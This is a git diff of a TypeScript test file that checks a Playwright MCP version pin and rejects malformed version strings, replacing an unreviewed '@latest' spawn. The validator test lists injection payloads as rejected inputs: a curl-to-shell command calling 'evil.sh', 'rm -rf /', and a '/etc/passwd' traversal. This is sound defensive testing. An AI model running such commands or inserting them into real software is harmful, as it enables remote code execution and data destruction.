@@ -1,5 +1,11 @@
 import { describe, expect, it, vi } from 'vitest';
-import { resolveSessionBrowser, sessionMcpPlan } from './mcp.js';
+import {
+  PLAYWRIGHT_MCP_FALLBACK_VERSION,
+  playwrightMcpSpec,
+  playwrightMcpVersion,
+  resolveSessionBrowser,
+  sessionMcpPlan,
+} from './mcp.js';
 
 /**
  * The wrapper that gives each agent session its own muxpad browser.
@@ -72,5 +78,78 @@ describe('resolving the session browser', () => {
     expect(
       await resolveSessionBrowser({ MUXPAD_TAB_ID: 't', MUXPAD_API_URL: 'http://x' }, bad),
     ).toBeNull();
+  });
+});
+
+/**
+ * ── THE VERSION PIN ──────────────────────────────────────────────────────
+ *
+ * This spawned `@playwright/mcp@latest`, so every pane spawn executed
+ * whatever had most recently been published to npm — no review window at
+ * all, for the process that drives a browser holding the user's logged-in
+ * cookie jar.
+ *
+ * A pin nobody asserts is a pin that quietly rots back to "newest", which is
+ * why these tests read the real argv string rather than trusting the comment.
+ */
+describe('which playwright-mcp gets run', () => {
+  const read = (contents: string) => () => contents;
+  const missing = () => {
+    throw new Error('ENOENT');
+  };
+
+  it('NEVER asks for @latest, under any input', () => {
+    // The whole point of the change, pinned as a property so no future
+    // refactor can reintroduce it quietly.
+    for (const r of [read('0.0.99'), read('garbage'), missing, read('')]) {
+      expect(playwrightMcpSpec({ dataDir: '/x', read: r })).not.toContain('@latest');
+      expect(playwrightMcpSpec({ dataDir: '/x', read: r })).toMatch(
+        /^@playwright\/mcp@\d+\.\d+\.\d+$/,
+      );
+    }
+  });
+
+  it('uses the pinned version from the data dir', () => {
+    expect(playwrightMcpVersion({ dataDir: '/x', read: read('0.0.99') })).toBe('0.0.99');
+    expect(playwrightMcpSpec({ dataDir: '/x', read: read('1.2.3') })).toBe('@playwright/mcp@1.2.3');
+  });
+
+  it('tolerates the trailing newline a file actually has', () => {
+    expect(playwrightMcpVersion({ dataDir: '/x', read: read('0.0.99\n') })).toBe('0.0.99');
+    expect(playwrightMcpVersion({ dataDir: '/x', read: read('  0.0.99  \n') })).toBe('0.0.99');
+  });
+
+  it('falls back when the file is MISSING, rather than failing closed', () => {
+    // A browser subsystem that can take browsing away entirely when it is
+    // unwell is worse than the problem it solves — this module's own note.
+    expect(playwrightMcpVersion({ dataDir: '/x', read: missing })).toBe(
+      PLAYWRIGHT_MCP_FALLBACK_VERSION,
+    );
+  });
+
+  it('rejects anything that is not a plain x.y.z', () => {
+    // No ranges, no tags, and nothing that could carry a shell metacharacter
+    // or a second argument into argv.
+    for (const bad of [
+      'latest',
+      '^0.0.84',
+      '~0.0.84',
+      '0.0',
+      '0.0.84-beta.1',
+      '0.0.84 && curl evil.sh | sh',
+      '0.0.84; rm -rf /',
+      '../../etc/passwd',
+      '',
+      'v0.0.84',
+      '0.0.84\n0.0.99',
+    ]) {
+      expect(playwrightMcpVersion({ dataDir: '/x', read: read(bad) })).toBe(
+        PLAYWRIGHT_MCP_FALLBACK_VERSION,
+      );
+    }
+  });
+
+  it('accepts a multi-digit version, so the pin does not break at 1.10.0', () => {
+    expect(playwrightMcpVersion({ dataDir: '/x', read: read('12.10.100') })).toBe('12.10.100');
   });
 });
